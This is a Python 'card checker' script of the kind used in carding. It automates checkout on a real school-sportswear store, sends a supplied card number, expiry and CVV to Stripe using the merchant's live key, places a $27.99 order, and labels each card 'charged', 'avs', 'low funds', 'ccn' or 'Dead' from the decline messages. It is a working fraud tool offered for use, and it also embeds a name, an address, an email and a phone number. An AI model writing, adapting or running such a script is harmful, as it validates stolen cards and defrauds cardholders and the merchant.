from utilsdf.functions import  capture
from httpx import AsyncClient


async def boruto(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False,
    ) as session:
        r = await session.get(
            "https://prepsportswear.com/school/us/new-york/accord/kerhonkson-elementary-school-ganders/product/fruit-of-the-loom-mens-5oz-cotton-t-shirt?productid=5078&schoolid=167239",
        )

        h2 = {
            "Host": "prepsportswear.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://prepsportswear.com",
            "Referer": "https://prepsportswear.com/school/us/new-york/accord/kerhonkson-elementary-school-ganders/product/fruit-of-the-loom-mens-5oz-cotton-t-shirt?productid=5078&schoolid=167239",
        }

        p2 = {
            "Activity": {"Name": "Ganders", "Tag": "M", "Group": "Mascot"},
            "Color": "royal",
            "Personalization": {
                "playerName": "",
                "playerNumber": "",
                "classYear": "2024",
            },
            "ProductID": 5078,
            "ProductSize": "Small",
            "Price": 27.99,
            "Quantity": 1,
            "SchoolID": 167239,
            "CartLineItemImageUrl": "",
            "CartLineItemDesigns": [
                {"PrintableArea": "Full Front", "DesignID": 51001, "Color1": "F8F8F8"},
                {"PrintableArea": "Full Back", "DesignID": 46259, "Color1": "F8F8F8"},
            ],
        }

        r2 = await session.post(
            "https://prepsportswear.com/api/cart/items?=",
            headers=h2,
            json=p2,
        )

        h3 = {
            "Host": "prepsportswear.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://prepsportswear.com",
            "Referer": "https://prepsportswear.com/checkout/shippingandbilling",
        }

        p3 = {
            "shippingAddress": {
                "FirstName": "Sachio",
                "LastName": "YT",
                "StreetAddress": "118 W 132nd St",
                "StreetAddress2": "",
                "ShowStreetAddress2": False,
                "City": "New York",
                "State": "NY",
                "ZipCode": "10027",
                "CityStateZipCode": "New York NY 10027",
                "CountryCode": "US",
                "Country": "United States",
                "ZipCodePlaceHolder": "Zip Code",
                "subscCol": {},
            }
        }

        r3 = await session.post(
            "https://prepsportswear.com/api/ps/checkout/UpdateShippingAddress?=",
            headers=h3,
            json=p3,
        )

        h4 = {
            "Host": "api.stripe.com",
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
        }

        p4 = f"card[name]=Sachio+YT&card[address_line1]=118+W+132nd+St&card[address_line2]=&card[address_city]=New+York&card[address_state]=NY&card[address_zip]=10027&card[number]={cc}&card[exp_month]={month}&card[exp_year]={year}&email=sachiopremiun%40gmail.com&guid=N/A&muid=N/A&sid=N/A&payment_user_agent=stripe.js%2F143084d6ba%3B+stripe-js-v3%2F143084d6ba%3B+card-element&referrer=https%3A%2F%2Fprepsportswear.com&time_on_page=27874&key=pk_live_7xS0ogDNa9kobWGvCMA0pLsZ"

        r4 = await session.post("https://api.stripe.com/v1/tokens", headers=h4, data=p4)
        t4 = r4.text
        tok = capture(t4, '"id": "', '"')

        p5 = {
            "BillingCard": True,
            "BillingCity": "New York",
            "BillingCountry": "United States",
            "BillingEmailAddress": "sachiopremiun@gmail.com",
            "BillingEmailAddressConfirm": "sachiopremiun@gmail.com",
            "BillingFirstName": "Sachio",
            "BillingLastName": "YT",
            "BillingPhone": "19006318646",
            "BillingState": "NY",
            "BillingStreetAddress2": "",
            "BillingStreetAddress": "118 W 132nd St",
            "BillingZipCode": "10027",
            "IsSubscription": False,
            "IsSMSSubscription": False,
            "SameAsShipping": True,
            "ShippingCity": "New York",
            "ShippingCountry": "United States",
            "ShippingFirstName": "Sachio",
            "ShippingLastName": "YT",
            "ShippingState": "NY",
            "ShippingStreetAddress2": "",
            "ShippingStreetAddress": "118 W 132nd St",
            "ShippingZipCode": "10027",
            "StripeTokenId": f"{tok}",
        }

        r5 = await session.post(
            "https://prepsportswear.com/api/orders?=", headers=h3, json=p5
        )
        t5 = r5.text
        st = capture(t5, '"success":', ",")
        msg = capture(t5, '"Value":"', '"')

        if st == "true" or r5.status_code == 302 or r5.status_code == 200:
            status = "Approved! ✅ -» charged!"
            msg = "Thanks -» $26.29"
        elif (
            msg
            == "Your card could not be authorized using the postal code provided. Please update the postal code, or contact your card issuer for further details."
        ):
            status = "Approved! ✅ -» avs"
        elif msg == "Your card has insufficient funds.":
            status = "Approved! ✅ -» low funds"
        elif msg == "Your card's security code is incorrect.":
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
